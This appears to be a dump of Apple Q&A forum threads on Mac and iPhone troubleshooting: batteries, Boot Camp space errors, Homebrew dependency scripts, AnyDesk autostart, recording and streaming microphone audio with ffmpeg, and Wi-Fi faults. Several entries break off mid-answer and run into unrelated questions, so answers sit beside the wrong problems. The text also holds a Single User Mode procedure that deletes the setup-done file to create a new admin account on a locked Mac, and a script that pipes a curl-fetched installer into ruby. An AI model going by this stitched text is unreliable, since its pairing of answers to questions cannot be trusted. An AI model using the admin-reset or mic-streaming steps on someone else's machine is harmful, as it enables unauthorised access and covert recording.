How can i reduce my system space.\n\n\nA: You can use the build-in Storage Management.app for inspecting what file is consuming large amount of disk space\nAnother software Daisy Disk is very useful for disk space visualising, so you can easily find out the large directories or files by checking the sector area (for directories that contains its files and sub directories)\n\nA: I have the same issue but just solved it.

I handed my MacBook Pro (15\" Touch bar) to the service centre in order to have the keyboard replaced. Now, when I check the battery cycle count, it shows \"1\". Before it was at \"82\". \nAlso, I'm getting a battery life of only 4.5 - 5 hours now. \nIs there a way to find if my battery was replaced or not? \n\nA: \nI gave my MacBook Pro (15\" Touchbar one) to the service centre for\n  replacing the keyboard...\n\nThis is the key element to your answering your question.\nWhen you need to have your keyboard replaced, they don't replace the keyboard; it's too time consuming and labor intensive (and somewhat dangerous due to the battery).  They replace the entire top case assembly.\nThe top case is an assembly of the following (major) components/sub assemblies:\n\n\n*\n\n*Aluminum case housing\n\n*Keyboard\n\n*Track pad\n\n*Battery pack\n\n\nThe battery pack is glued in place and Apple advises service centers to not attempt removal; so they don't.  They just replace the entire thing.\nIf you took your MacBook to an authorized service center, everything will be genuine Apple parts.\nRegarding the lower run times...\nYou may have received something called NOS (New Old Stock) meaning the top case may be new, but it's been sitting on a shelf for a couple of years.  The battery, though unused, is still degrading even though it's sitting on a shelf somewhere.  Return it to your service center and make them aware of the issue.\n\nA: Actually if your cycle count shows 1 that means they replaced the battery. Stolen implies that you no longer have a battery in your Mac. And if by \"backup\" you mean that you are getting 4 1/2 - 5 hours usage out of the Mac on just the battery then that is an acceptable run time depending on what you are doing on the Mac.\n\nA: You can get some more detailed information on the battery, including serial number, manufacturer, and most importantly in this situation, the DATE of manufacture. The best way I've found to do so is to use an application called Coconut Battery (no affiliation, just a very happy user), which can also help track the battery's health over time, as well as the same information for your iOS devices.\nUsing Coconut Battery, you can see if the battery's manufacture is after you purchased your MBP, or lines up closely with the manufacture date of your MBP itself.\n", "Q: why iphone \"text to speech\" english is much clearer than french? after config in “Settings>General>Accessibility>Speak”, i could select a paragraph of text then could let iphone \"speek\" it out.

Not so much.\nI don't know how those weird characters would've gotten added; did you try to edit the file with some sophisticated editor that thought it would be a good idea to use the very latest trendy formatting characters, rather than just sticking with what'll work? If so, don't use that editor for unix-style config files (or scripts, or...). I recommend BBEdit instead; even if you don't buy it, it'll let you do the basic stuff in its free demo mode.\nAs for how to fix it... Well, first make a backup copy in case this goes sideways and messes things up even more than they are now.

The other thing is the thermal paste apple used was terrible on all those older iMacs... If you haven't replaced I would definitely do that as well, some of the machines I've played with, the thermal paste was no longer doing anything...It's not really complicated and there are a lot of video guides available if you need them...I would redo cpu and gpu at the same time... That will give you a noticeable reduction in temps...Then when you get your fans set up properly, you should get another drop in temp plus a drop in noise, and probably add a few more years of life to your system. I use Kryonaut thermal grease just a personal preference but there's lot of good stuff out there. the other thing that will help is a good cleaning if it hasn't been opened in a few years...

Battery is direct from iFixit. I've replaced iPhone batteries before and everything seemed to go right. Problem: I charge it fully before bed, and when I wake up it has like 30% power. My iPhone 6 will have battery percentage above 90% in the morning. I understand the 4s battery is 1430 mAh vs the 1810 mAh in the 6. But the drain difference seems too big. I did a DFU restore of OS 9.3.5 (the highest a 4s supports). Didn't help. Ran battery to zero once to condition it. Auto-lock is set at 1 minute. Mail accounts are set to fetch, most notifications turned off, etc. Seems like the iPhone just doesn't fully go to sleep to save battery. Any ideas on how to slow the battery drain? Is that just how it's supposed to work? Should I give up and get her a newer iPhone? \n\nA: The only thing I could recommend for an older Apple device is to call Apple Support and have them run diagnostics on the device (or you can visit a store). \nWorst case scenario, the only thing that may be the culprit is the logic board. Apple no longer has those so you may need to contact an Apple Authorized Service Provider and see if they can order the parts or find someone that could be selling the parts.\n\nA: Before giving up, I did a little more research and found that iCloud stuff is a common battery killer. I turned everything iCloud off (Photo stream, Backup, Contacts, Reminders, etc.) except Find My Phone. Did a hard reset, then gave it a full charge. This morning it had 12% after 17 hours of standby. Not great, but usable. I think that was the big remaining culprit. \np.s. I think previously I was getting like 9 hours of standby power after a full charge. So turning off all that iCloud stuff appears to have doubled the battery life. I'm guessing either the hardware in the 4s can't practically handle those features, or the OS isn't really designed for a 4s, or the logic board is shot somehow.\n", "Q: Macbook Air charger not working The circumstances of my Macbook Air (late 2010 model) and its inability to charge the battery are a bit unique from the other cases I've read about on forums:\n\n\n*\n\n*My battery would not charge, and the computer would die instantly upon removing the MagSafe cable. \n\n*The MagSafe indicator light would sometimes show a very faint green, but most of the time, it was completely off. \n\n*I tried resetting the SMC; nothing changed.\n\n*I tried multiple outlets; nothing changed.\nCoconut Battery gave a \"check battery\" status, indicating it needed to be replaced. I did so.\n\n\nCoconut Battery likes the new battery, but it has the same issues:\n\n\n*\n\n*When the computer is on and plugged in, the system's power status says \"Not charging.\"\n\n*When I unplug, the battery powers the system just fine. But eventually, it will lose power from not charging, and I'll be back at Square One. \n\n*The MagSafe indicator light is still off with the new battery. I've tried jiggling it when it is in the port; no change.\n\n*I've tried cleaning out the MagSafe port; no change.\n\n*I've tried using a different duckhead adapter; no change. \n\n*The pins on the MagSafe plug appear fine. \n\n*I've tried resetting the SMC several more times; no change.\n\n\nI'm out of ideas. I suppose I could try using a different power adapter, but I don't have another on-hand with a compatible MagSafe adapter. Apple's next recommended step is to get the machine serviced. But I'd rather pursue more DIY options if they exist.\n\nA: Once you've reset the SMC once - that's out of the picture. Let's assume your situation is different than all the rest - My MacBook Air won't charge - and it's not the adapter or the pins or something you can fix and identify without turning a screw or opening the Mac.\nNow you have to figure if the adapter is bad - you didn't explicitly say that, but it's probably not since you would report that the system is dead and won't power on ever again if you can't get some adapter to put charge back in the battery when the machine is off and sitting overnight.\nAt this point, you still need a hardware repair.\nA repair shop might be able to tell if the battery needs replacing but since you did that - you either have a totally unlikely circumstance that the old battery failed in a non-common way and the new battery happens to have the same non-common failure mode. The new battery should show clean in system information even if it won't charge due to other issues. The real key is if the new battery shows \"check battery\" status you would want to return that part if you're sure you didn't do the repair wrong (you'll risk being charged for the shipping and not get your money back if the part is good) but it's far more likely the fault is with the charging circuitry and power handling circuitry. Also, you probably needed a new battery too so that's out of the way now.\nThe likely cause is you need a new MagSafe power in board for the Air or a new logic board. Sorry to deliver the news, but the alternative to this diagnosis is that the cables or the new battery were bad and it will be costly to figure that out as well.\n", "Q: Will external monitor damage my MacBook? I have a MacBook Pro 2016 with touch bar (15”) and I consider making it my primary computer, as my iMac turned to be very old now. \nIf I will I need to get an external monitor and for that I’d like to buy the lg ultrafire 5k. \nMy only concern is I’m very worried making the MacBook a primary computer will shorten its lifespan, make it heat a lot and noisy and generally destroy it. \nI’m a software developer and I work with my iMac 10+ hours a day with heavy use thus my worries. \nIf it will ruin the nacbook I’ll rather just get another iMac so it’s not a budget issue (I just rather wait for the new Mac Pro instead of buying the iMac pro now but if it’s in the cost of completely destroying my MacBook I’ll buy the iMac pro now).\nDoes anyone have experience with such issues or knows if I should be worried or not?\n\nA: Short answer\nWhat you’d like to do is totally safe. In fact, your MBP can handle more external displays than what you’re wanting to use.\nLong answer\nWhile I understand it, you shouldn’t let the experience of what happened to you in 2010 dictate what you do now.  For example, a number of MBP models have had faulty GPUs and you may have been using one of those. \nRegardless, to make a decision about your current setup, you need to use the specs of your current MBP to determine if it’s up to the task you need it for.\nYour MBP actually has two GPUs, an integrated one (Intel HD 530) and a dedicated one (AMD Radeon Pro 455).\nThe important thing here is that the AMD Radeon Pro 455 has 2 GB of dedicated GDDR5 memory and is capable of supporting up to two 5K displays or four 4K displays. So, wanting to use it with one is not going to cause you any problems.\nSo, assuming the MBP itself is fine to run the software and/or hardware you need, then using it with an external display is not going to cause a problem.\n", "Q: Permission errors, safari passwords disappear, dock resets and iCloud problems I've searched a lot and cannot find a similar question for High Sierra. Whats irritating is that I hadn't upgraded to 10.13.4 but it happened on its own one evening. Once my MacBook restarted - the first problem was that passwords and autofill information in Sierra stopped showing up - and all fields were empty (in preferences). I tried to fix that and the only workaround without a full restore was to completely unlink my iCloud account from my MacBook - which isn't ideal or feasible - and viola - my passwords show up in safari (I don't know how). When I login to iCloud again (on my mac-settings), THE PASSWORDS DISAPPEAR AGAIN! Next, I noticed the dock resets to default apps, including those I'd hidden, after every restart. An app that stopped working with a \"invalid license file\" issue was witopia. I tried a few reinstalls to no avail.\nI've done the permission repair fix as advised for earlier versions of sierra. I've also used the HD permissions repair utility. Other than a full restore which will take me back by about 3 months, I'm at my wits end as to why all these issues started and how to fix them. The only point of reference for me is that 10.13.4 install which I didn't even initiate!\nIn summary:\n1. I cannot use iCloud without breaking safari stored passwords and autofill\n2. My dock resets every start and its getting annoying\n3. Some apps are now broke and can't work (a new install fixed one of these problems but this isn't right)\n4. Everything else seems to be working fine: mail, safari, word, excel and powerpoint, some media apps\nI'd ideally like to avoid a full restore or reset. I would like to clean up things and that includes fixing my iCloud account/keychain access if it has problems. By the way, my iCloud passwords are fine on my iPhone. I also checked keychain access but don't know how to check/fix any issues (if any) with that.\n\nA: This may mean that your data may have a bug in it.

I am trying to write a shell script to automate installation of a bunch of dependencies for a project on macOS which will be an equivalent script for the same that works on EL6/EL7 and uses the yum package manager. This script will try to leverage HomeBrew to do the same. \nA few of the tools/dependencies/packages that I want to automate installation are gcc, wget, make, cmake and git and so forth. I want to first check if any of these exist already, then update them or else install them. As you can see in this following snippet I am first trying to check if brew exists already, then update it or else simply install it. \n#!/bin/sh\n\necho Checking brew\n#Check if Homebrew is already installed else prompt the user to do so.\n\nBREW_INSTALLED=\"/usr/local/bin/brew\"\n\n\n#Variables to check if dependencies exist.\nHOMEBREW=$(which brew)\n\necho $HOMEBREW\n\nif [ \"$HOMEBREW\" == \"$BREW_INSTALLED\" ]; then\n    echo \"Brew is already installed.\"\n    echo \"Update Brew\"\n    brew update\nelse\n    /usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\nfi\n\nNow, my questions are (multipart question!)\n\n\n*\n\n*Is it the right way to use which brew or which X where X can be gcc, make etc. and then compare them with hardcoded /usr/bin/X to check their existence? Since I have quite a list of them I need to check and install so declaring variables for all and cross checking with paths somehow doesn't seem appropriate to me.\n\n*How to handle the situation where the user has these packages installed but at some different location for whatever reason they might have? (This seems a bit objective but to ensure the project compiles and builds upon these dependencies should I force these paths only?)\n\n*Also, one or more packages might be git repos and need to be cloned, compiled, make installed on the fly. What should be the proper place to put the generated .dylibs and create symlinks to make sure all these interdependent packages can find one another and work in peace?\n\n*Is there anything equivalent to virtual_env or jenv to isolate all these installations (of course using HomeBrew they end up in /usr/local/Cellar)? But, as macOS does come with at least a few of them (git, gcc etc.) I don't want to duplicate installations.  \n\n\nP.S. Any help in terms of a direction, resource or an example project working with large amount of dependencies will help. I just can't figure out the right keywords or the right resources to look for a solution or a partial solution. Thanks. :)\n\nA: To piggyback off nohillside, I was gonna say you might be able to just achieve a lot of that by creating your own tap! You can even tap a repo hosted elsewhere (say like a private one, bitbucket, or anything) as long as you specify the git url after brew tap\n\nA: Homebrew knows what packages you installed already, so even if you install gcc twice (by running brew install gcc), it will just install once. So you can safely put a bunch of brew install <package> commands in you scripts without needing to worry about wasting much time.\nWhat's better is Homebrew support Brewfile, which allows you to define all the dependency in a single file and install all of them by running brew bundle --file=<path/to/brewfile>\nHere is a example brewfile:\nbrew \"ack\"\nbrew \"git\"\nbrew \"python3\"\n\nthis is equivalent to running:\nbrew install ack git python3\n\nYou can find more example of brewfile, just google it.\n", "Q: How do I create a permanent snapshot of a Time Machine backup I did a clean install of my Mac and continued to use my same Time Machine drive.

So, then I plugged in the charger and powered it on. This time I noticed something was strange. The battery was stuck in 0% for like around 10 minutes and the date got reset to 1st January 2017. I tried resetting NVRAM. Nothing happened. So, then I ran diagnostics and I got this as a result:\n\nHere's the battery information:\n\nHere's a screenshot from Battery Health:\n\nNow it is pretty obvious that you might ask me to change the battery because the screenshots say so, but I want a final opinion from you guys what to do next. Everything was working fine and all of a sudden this happens. I feel if I plugged the charger in time, I wouldn't have to see all this. And also a new battery isn't exactly affordable for me at the moment. And it is also important to note that while the charger is on, it shows orange LED. So, what should I do?\n\nA: Your battery is dead.\nYou need to replace the battery.   Granted, it's a bit young at just under two years and 820 cycles, but it's not uncommon nor unheard of.  Unfortunately, batteries die for any number of factors.\nWith your specific battery, it appears that it won't take a charge, thus it cannot hold one.\n\nEverything was working fine and all of a sudden this happens. I feel\nif I plugged the charger in time, I wouldn't have to see all this.\n\nThere are a number of factors that contribute to premature battery death - it could have been defective from the factory or you could have subjected it to extreme conditions.  Perhaps something in between.  The point is, it happens.  There is nothing you could have done to prevent your battery from degrading.\n\n...also a new battery isn't exactly affordable for me at the moment.\nAnd it is also important to note that while the charger is on, it\nshows orange LED. So, what should I do?\n\nFirst off, the orange LED means it's sending voltage to the charging circuit or \"charging\" for short.   It doesn't mean it's \"successfully charging\" the battery.\nGetting an Apple Store to change out your battery will be very expensive (minimum $500).  However, a replacement battery alone is fairly inexpensive (around $70 USD) if you are willing to change it out yourself.  ifixit.com has an excellent step-by-step guide to walk you through it.  They rank it as difficult, not because it's complex (it actually quite simple) but because the battery is glued in and you have to be careful.\n\nA: I saw your battery is already very close to dead with 4000mAh max capacity (the 100% healthy battery has 6500mAh). So everything could happen. You need to replace it. \nI'm not sure how it died so fast... Actually I bought the same model on 2016 spring and keep using it everyday until today (heavy use) and it still has 5700mAh.\n", "Q: Bootcamp: The startup disk does not have enough space to be partitioned When clicking continue on the first Boot Camp screen,  I am presented with a dialog that displays:\n\nThe startup disk does not have enough space to be partitioned.\n  You must have at least 39 GB of free space available.\n\n\nThis is despite \"About this Mac\" reporting 271GB of free space:\n\nAnd \"Disk Utility\" reporting 268GB of free space:\n\nSearching online I found this reddit thread which suggested it was the result of Time Machine which i recently enabled and suggests to run sudo tmutil thinlocalsnapshots / 999999999999 which I did, it ran sucessfully, and I restarted, yet to no avail.\nWhat is the solution to this instance of Apple's poor engineering?\nRunning macOS High Sierra 10.13.4 (17E202)\n\nA: Open activity monitor and force quit backupd, then click continue in the bootcamp assistant.\n\nA: Okay, the solution is that I did not disable Time Machine and remove all backup drives first. Doing that solved the issue. So the full solution is:\nDisable \"Backup Up Automatically\" in Time Machine System Preferences, and remove all backup drives, such that it looks like this:\n\nThen run sudo tmutil thinlocalsnapshots / 999999999999\nAnd try again. Optionally restart the computer and try again.\n\nA: In Mojave, what I had to do was turn off Time Machine and then run this command to force clean out the local snapshots:\ntmutil thinlocalsnapshots / 1000000000 1\n\nwhere 1000000000 is the size of your drive and the \"1\" means urgent.

Apple has updated its privacy policy since the incident with FaceBook took place.\nBut if you want to transfer the account call Apple Support. You'll need the death certificate and a court document that confirms that you are the decedent's legal personal representative. That document needs to be notarized or certified by a US court.\nIf you just want to remove the account from the iPad, if you have a receipt or invoice from where the device was purchased with the devices serial/IMEI number along with the sellers location, and contact info then the FindMyiPhone team at Apple Support can remove the account from the iPad.\nIf you can't do either, then at least call in and get help with recovering the password by calling in. Worst case scenario, it'll put you in account recovery in which after waiting a period of time, you'll get access to the account.\n\nA: Apple has provided an online system to delete Apple IDs in such a case.\nVisit http://digital-legacy.apple.com\nYou will need\n\n*\n\n*The Apple ID of the deceased (but you do not need the password)\n\n*The \"Letters of Appointment\" as the personal representative of the\ndeceased, typically provided in the United States by the County court after filing a request to be appointed per the decedant's Will (a probate lawyer can file this for you), and\n\n*the death certificate.\n\nPeace be with you.\n", "Q: Macbook suddenly refusing password Mid-work at airport, Macbook pops login screen.

So currently Macbook is bricked, I'm in a country without a Genius Bar, and all my work is on the machine...\nAnybody else experiencing these issues? Anything worked?\n\nA: I haven’t come across this, but it may be worth trying to create an additional Admin account and logging into that to reset your password on your current account.\nHow to create an additional Admin account\nYou can do this by tricking your Mac into thinking it's being set up as new:\n\n\n*\n\n*Boot into Single User Mode by restarting your Mac and pressing and holding ⌘ + S as soon as you hear the startup chime\n\n*Keep these keys down until you see a black screen with white text \n\n*Mount your drive by typing in /sbin/mount -uw / and then pressing the enter key\n\n*Remove the Apple Setup Done file by typing in \nrm /var/db/.AppleSetupDone and then pressing the enter key\n\n*Now reboot your Mac by typing in reboot and then pressing the enter key\n\n*Follow the prompts to complete the setup process and create a new admin account\n\n\nOnce you've done the above, try starting up and logging in as the new admin user. Assuming you can, then see if you can edit the password in your old account (just try changing it to your existing password).\n\n[UPDATE]\nSince we've established that even trying to boot into Single User Mode isn't working for you and that trying to do so results in the normal login screen appearing, I think we'd better investigate the possibility that your keyboard is faulty. This would explain your password not being accepted and the fact that pressing keys during startup may not have the desired result.\nThe best way to test this is to connect a USB keyboard and try using that. If you haven't got one, any cheap USB keyboard will do.\n", "Q: Terminal command to record audio through macbook microphone? Is there a command we can use via terminal to start recording audio through my macbook microphone?\n\nA: Use FFMPEG.\n(This has become one of my favorite command line utilities for video/audio conversion and streaming).  It's an open source framework for audio/video encoding, decoding, streaming, converting, and muxing.  It's included with many (paid) AV utilities. \nYou can capture the audio as a stream through Apple's AVFoundation.\nGet the device ID\n$ ffmpeg -f avfoundation -list_devices true -i \"\"\n\n[AVFoundation input device @ 0x7fda1bc152c0] AVFoundation video devices:\n[AVFoundation input device @ 0x7fda1bc152c0] [0] FaceTime HD Camera (Built-in)\n[AVFoundation input device @ 0x7fda1bc152c0] [1] Capture screen 0\n[AVFoundation input device @ 0x7fda1bc152c0] AVFoundation audio devices:\n[AVFoundation input device @ 0x7fda1bc152c0] [0] USB Audio CODEC\n[AVFoundation input device @ 0x7fda1bc152c0] [1] Built-in Microphone\n\nThe device you're going to need is \":1\"  AVFoundation uses the convention \"V:A\" for \"Video:Audio\"  so, if you want to capture video from your FaceTime camera the the audio from your Microphone, you would use \"0:1\".  If you wanted just the audio only, you would use \":1\" and leave the video out.\nRecord the Audio:\n$ ffmpeg -f avfoundation -i \":1\" -t 10 audiocapture.mp3\n\nThe above command will record 10 seconds of audio from the built in microphone and save it as audiocapture.mp3.  You can set how long you want FFMPEG to record by changing the value for -t.  If you want to record a full hour, set it to \"3600\".\n$ ffmpeg -f avfoundation -i \":1\" -t 3600 audiocapture.mp3\n\nWhat the flags mean\n\n\n*\n\n*-f = \"force format\".  In this case we're forcing the use of AVFoundation\n\n*-i = input source.  Typically it's a file, but you can use devices. \n\n\n*\n\n*\"0:1\" = Record both audio and video from FaceTime camera and built-in mic\n\n*\"0\" = Record just video from FaceTime camera\n\n*\":1\" = Record just audio from built-in mic\n\n\n*-t = time in seconds.  If you want it to run indefinitely until you stop it (ControlC) omit this value (not recommended)\n\n\nInput Volume\nKeep in mind that you're using the built-in microphone which isn't great to begin with.

When I record a screen (video with sound), the machine heats up rapidly (80 celsius in less than 1 minute of recoding).\n\nA: That sounds reasonable especially if you're not in a cold environment. You're recording at a minimum of 240 million pixels per second internally (display resolution plus scaling, at 60fps) — that's going to be strenuous on the computer just like any heavy video processing workload. 80℃ is not out of the ordinary for any situation where you're taxing system resources.\n", "Q: Curl from Pastebin messes with carriage returns Whenever I use curl to get a file like .profile from Pastebin, the .profile file isn't read properly. I did some checking, and it seems to be down to the carriage returns.\nHow do I solve this problem?

Building on @Allan's answer, I'm trying to redirect the ffmpeg output to a server. \n$ ffmpeg -f avfoundation -i \":1\" -t 10 - | ssh user@host .... -\n\nBut I get the following error message:\n\n\"At least one output file must be specified\"\n\nI've also tried using ffserver instead of SSH but I'm not having any luck.\nIs it possible to stream audio in this way?\n\nA: There are two solutions I can visualize for this scenario:\n\n*\n\n*Saving the file to a remote computer\n\n*Having a live stream broadcast so a remote computer can receive the audio\n\nSaving the file\nThis is probably the easiest method.  Allow the stream to finish recording then copy it to a predetermined location on the network.  This script should fit the bill:\n#!/bin/bash\n#\nffmpeg -f avfoundation -i \":1\" -t 10 audiocapture.mp3\nscp audiocapture.mp3 user@host:/foo/bar/audiocapture.mp3\n\nexit 0\n\nThe script doesn't do any error checking of any kind but, will record from the microphone, then when finished it will copy it via SCP (secure copy) to a remote computer.    To make this work, you need to set up SSH Keys to facilitate a non-interactive login.\nStream in real time\nThe other method, is to broadcast the audio via TCP via a point-to-point connection. Using the same input from the previous answer, we just change the output to a network stream:\n$ ffmpeg -f avfoundation -i \":1\" -t 10 -f mpegts \"tcp://remote_host_or_IP_:port\"\n\nWhere....\n\n*\n\n*-f is the transport format; in this case mpegts (MPEG Transport Stream)\n\n*tcp://remote_host_or_IP_:port is the URI value of the remote computer's hostname/IP address and port number it will be listening on.\n\nSet remote computer to \"listen\"\nUsing ffplay the remote computer can be set to receive the stream (I used Windows 10 for this part, but will work in macOS/Windows/BSD/Linux)\nIssue the command\nffplay -i tcp://local_host_or_IP_addr:port?listen -hide_banner\n\nWhere....\n\n*\n\n*-i defines the input stream\n\n*local_host_or_IP_addr:port is the IP address or hostname  and the TCP port of the computer that's listening (not the computer that's streaming).\n\n*?listen is required to put it into \"listen mode\" otherwise it will time out if the stream is not there.\n\nBelow is an example done in Windows 10 receiving the stream from a macOS host's microphone.

On my iMac, I tend to adjust the Turn off display after: from short to long and back again, pretty frequently. It would be convenient if I could get to this with one click, perhaps from the menu bar. Is there a way to accomplish this?\nIt's not one of the things in /System/Library/CoreServices/Menu Extras.\n\nA: Native option\nYou're most likely aware of this, but for the benefit of others I thought it worth mentioning even though it's not exactly what you're after anyway.\nBy going to Apple > System Preferences > Energy Saver users will have a checkbox at bottom left of the window that they can tick to enable access via the menu bar. The option provided here differs depending on whether you have a MacBook model of some sort or a desktop computer, and also depending on the version of macOS you're running. In summary:\n\n\n*\n\n*MacBooks will have a Show battery status in menu bar option\n\n*Desktop Macs may have no option at all, or they may have an option for Show UPS status in the menu bar (this depends on the version of macOS you're running and whether you have a compatible UPS connected)\n\n\nEnabling one of the above options doesn't give the one click solution you're after, but will give you quicker access to the Energy Saver preference pane, effectively making it a two click solution instead of the usual three clicks.\n3rd party options\nSince there's no perfect native option I think you're best bet is to use a 3rd party menu bar utility that allows you to override your Mac's sleep settings whenever you need. \nThere are numerous options (both free and paid) and ones available on the Mac App Store or not. The option you go for depends somewhat on the version of macOS you're running and personal preference.\nTo start with, open the Mac App Store app and conduct a search for \"caffeine\". This will return a number of options you can choose from. One notable option that doesn't appear on the list of search results is Amphetamine (so I link to it here separately - last time I checked it was free).\nAnother option not available on the Mac App Store is KeepingYouAwake. This is basically a wrapper around Apple's native “Caffeinate” Terminal command which can be used to alter your Mac’s sleep behavior. Caffeinate is Apple’s official command line utility - if you haven't heard of it and are comfortable using Terminal, then you can view more information by launching Terminal and running the man caffeinate command. Otherwise, KeepingYouAwake is a GUI version that runs it for you without having to use Terminal. Just keep in mind that the version you run will depend on the version of macOS you're using.\nIn summary, I'd probably start with the Mac App Store search and go from there. \nNOTE: I am not affiliated with any of the products mentioned in this answer.\n\nA: 3rd Party option\nYou can use this little program called BitBar which allows you to add various plugins to the menu bar. You can also write your own scripts with many different programming language such as Python, Shell, Javascript, etc. …\nThere is for example a plugin for the caffeinate utility mentioned earlier.\nNOTE: I am not affiliated with any of the products mentioned in this answer.\n", "Q: Where do offline synced google docs get stored on Mac OS X? If I turn on google docs/sheets/drive offline sync through chrome on os x and activate \"Make Available Offline\" for some doc, where is the doc stored locally on my machine?\nI am not talking about google back up and sync - I am talking specifically about activating offline docs sync through a browser (in this case chrome).\nThis answer gives the answer for PC, Android, and Linux but not mac. I looked in all the typical Application Support folders as well as in Chrome Developer Tools --> Sources --> Filesystem and also Developer Tools --> Application --> IndexedDB but I cannot figure it out. IndexedDB --> GoogleDriveDs --> Offline shows an entry for offline synced files (and not others) but it doesn't help me find it locally on my disk.\nThanks!\n\nA: It is stored in:\n~/Library/Application Support/Google/Chrome/Default/IndexedDB\nwhere \"Default\" might need to be substituted by your profile name.\n", "Q: How to stop the Anydesk application from opening at startup? I utilize this application called Anydesk for remote desktop very frequently, and while I was recently removing programs from starting up at login (because I wanted a faster start up speed) I noticed that Anydesk wasn't in the list of login items, even though it shows up whenever I login after I restart/shut down the computer. \nHow does one rectify this issue? \nI am running OSX El Capitan on a 13\" MacBook Pro. \n\nA: For Windows users, you have to disable the application on startup and change the service startup type to manual.\nFor example on Windows 10 you should do the following:\n\n\n*\n\n*Task Manager => Startup tab => right click on AnyDesk and change it to disable.\n\n*Control Panel => Administrative Tools => Services => AnyDesk Service => Right click and select properties => Startup type from [Automatic] to [Manual] => also you can press on stop button.\n\n\nNext time when you want to start the application, windows will ask for permission (UAC) to start the AnyDesk service and also after quitting the application windows will ask for permission (UAC) to stop the service.\n\nA: After several attempts I finally found the file that is created during the installation process. So to prevent AnyDesk from starting at login, you need to delete the file,\n/Library/LaunchAgents/com.philandro.anydesk.Frontend.plist\n\n\nThat solved my issues with autostarting AnyDesk at login.\n\nA: I looked into the plist file (/Library/LaunchAgents/com.philandro.anydesk.Frontend.plist) suggested in one of the answers here.\nYou can open the file using any text editor and change the lines:\n<key>RunAtLoad</key>\n<true/>\n\nto\n<key>RunAtLoad</key>\n<false/>\n\nThis worked for me.\nUpdate for file path:\n/Library/LaunchAgents/com.philandro.anydesk.Tray.plist\n\nA: Open System Preferences > Users & Groups > Login Items\nSelect AnyDesk, then press the minus button.\n\n\nA: Open your terminal and type this :\nsudo plutil -replace RunAtLoad -bool false /Library/LaunchAgents/com.philandro.anydesk.Frontend.plist\n\nBasically this will set the auto start boolean value in the *.plist file from true to false which as a result would disable the autostart function. It's practically the same thing as the above solutions but much simpler.\nUser was on version 5.0.1 at the time of this answer.\nWorks on version 6.3.2\n\nA: This worked for me since AnyDesk was not listed in my system preferences login programs. \n<key>RunAtLoad</key>\n<false/>\n\n\nA: try this command \nsudo rm /Library/LaunchAgents/com.philandro.anydesk.Frontend.plist\n\n", "Q: Why can a command in Safari's Javascript (JS) console not call a previously defined function?

Right now, there are three drives inside: two SSDs and the original 1TB HDD.\n\nDisk 0 (first SSD) boots Windows 7 (originally installed from DVD), Disk 2 (second SSD) boots High Sierra (installed from USB). At the present moment, both systems are bootable (by holding down Alt).\nI want to add the following tools to Disk 1 (the HDD) (ISO images are available):\n\n\n*\n\n*Windows install\n\n*Acronis boot rescue partition. This is basically a customised Linux. It boots perfectly when burned on DVD (but there is no DVD drive anymore)\n\n*maybe a diagnostic Linux LiveCD\nThe HDD is completely empty and either Windows or OSX tools can be used to partition it and set it up. There is some flexibility here.\nI have managed to set up a bootable Windows install partition by creating a MBR partition table in Windows, copying the ISO contents then fixing the boot sector using bootsect.exe and marking the partition active. This gives an additional option when holding down Alt and starts the Windows install correctly. \nHowever, no method worked with the Acronis image. I have tried copying the contents and setting it active. I also tried to \"burn\" it on a partition using dd in Terminal under OSX. At best, an \"EFI Boot\" option shows up at startup, but clicking on it simply freezes the system.\nWhat to do next? Which partition scheme to use? How to transfer the images?\nPlease note that booting anything other than OSX install from USB is impossible on my iMac. (Yes, it is. Tried every method and recipe in the world.)\n\nA: I used the AOMEI partition manager for the partitioning and cloning, but similar software will do probably just as fine.\n\n\n*\n\n*In Windows, clone Disk 0 to Disk 1. This results in another bootable system on Disk 1. Disk 1 has three primary partitions (just like Disk 0). \n\n*Create a fourth ~10GB partition at the end of Disk 1. Assign it letter Z.\n\n*Mount the windows ISO (using Daemon Tools or similar), then copy the contents to Z:.\n\n*Open the command prompt, go to the mounted image, then:\ncd \\boot\nbootsect.exe /nt60 z:\n\n(if it throws any error, make sure Z: is not open or used anywhere)\n\n*Create directory _bootimages on Z:, and copy all ISO files you want to be able to boot from.\n\n*Download EasyBCD and start it.\n\n*Add all ISO's to the boot menu, giving them descriptive names.\n\n*Under the WinPE tab, add another entry. Call it \"Windows 7 setup\" and point it to Z:\\sources\\boot.wim.\n\n\nRestart, hold down Alt and click the \"Windows\" option that corresponds to Disk 1. A boot manager will pop up.

It stops working after a few minutes and shows \"No wifi hardware installed\" after reboot. A PRAM / NVRAM reset sorts this out until the next time. SMC reset also temporarily solves the problem.\nThe computer also has Windows and Ubuntu installed and the wifi works fine in both. Does anyone know a fix for this? \nNormally I would just update to fix most Apple problems but the latest update (2018-001) won't install as it will render the Bootcamp partition unbootable!\n\nA: I would start with something simple and boot into Safe Mode and test how well your Wi-Fi works while in Safe Mode.\nFollow these steps::\n\n\n*\n\n*Fully shut down your MBP\n\n*Restart your MBP\n\n*Immediately press the Shift key and keep it down \n\n*Let go of the Shift key when you see the login window (NOTE: If you have FileVault enabled you may need to log in twice. Also note that booting into Safe Mode can take a while!)\n\n*Take a note of what happens (i.e. can you now connect to the Wi-Fi network and stay connected?)\n\n*Exit Safe Mode by restart your MBP as normal and test again\n\n\nThe act of booting into Safe Mode will actually perform a number of background tasks, and this often resolves issues when you've rebooted normally.\nOnce you've tried the above let me know how you go.\n[Update 1]\nSince we've established the issue is still present during Safe Mode and that it still keep recurring after resetting NVRAM, let's next test your hardware for signs of any problems.\nRun Apple Hardware Test\nYour model MBP uses Apple Hardware Test. To use this, follow these steps:\n\n\n*\n\n*Shut down your MacBook Pro \n\n*Restart your MacBook Pro\n\n*Press and hold the D key before the gray startup screen appears.\n\n*After a while, Apple Hardware Test (AHT) will start.\n\n*When prompted, select your language and click the right arrow. \n\n*When the AHT console appears, you can choose to run Basic tests by clicking the Test button. However, I suggest you select the \"Perform extended testing\" checkbox before you click the Test button.\n\n*Your test results will appear in the window in the bottom-right of the console.\n\n\nNote 1: that the extended test will take some time. Take a note of the results and report back. \nNote 2: If pressing and holding the D key at Step 3 doesn't work, start again at Step 1 and, at Step 3 press and hold both the OptionD keys instead. This will try and run diagnostics from the internet instead, so you will need to allow more time for it to complete.\n[Update 2]\nAnother option worth trying is to remove your Wi-Fi service, restart, and add your Wi-Fi service back.\nTo do this:\n\n\n*\n\n*Go to Apple > System Preferences > Network\n\n*Select the Wi-Fi service on the left-hand side\n\n*Click on the cog icon at bottom-left and select Make Service Inactive\n\n*Now delete the service by clicking on the minus sign (i.e. the 